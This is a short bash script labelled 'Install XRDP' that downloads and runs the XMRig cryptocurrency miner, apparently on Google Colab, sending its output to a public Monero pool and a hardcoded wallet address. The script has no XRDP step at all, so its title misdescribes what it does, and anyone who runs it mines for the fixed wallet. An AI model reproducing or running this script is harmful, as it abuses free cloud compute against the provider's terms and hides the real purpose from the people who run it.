#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
tar xvzf xmrig-6.18.0-linux-x64.tar.gz
cd xmrig-6.18.0
./xmrig -o pool.supportxmr.com:443 -u 87W8JEibzdAWYmLmecWtDUPh9BzANEiZLKHxYQv1oi5XD4SwMZZSfefAGwz1SH2woXLRE3sJsvJpubxk1pAXKcGsC5yYNFt -k --tls --rig-id GC-US
